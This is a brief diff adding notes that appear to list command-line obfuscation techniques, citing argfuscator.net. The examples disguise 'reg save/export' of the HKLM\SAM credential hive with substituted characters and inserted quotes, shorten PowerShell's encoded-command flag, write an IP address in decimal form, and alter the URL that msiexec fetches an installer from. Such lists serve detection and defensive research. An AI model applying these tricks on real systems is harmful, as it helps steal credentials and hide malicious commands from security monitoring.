@@ -1,0 +1,8 @@
+https://argfuscator.net/
+
+Character substitution: reg eˣport HKLM\SAM out.reg
+Quote insertion: reg “s”a”v”e H”KL”M\S”AM” out.reg
+Character deletion: powershell -en [encoded payload] instead of -encodedcommand
+Value transformations: ping 2130706433 instead of ping 127.0.0.1
+URL manipulation: msiexec https:\\example.org/install.msi instead of using https://
+
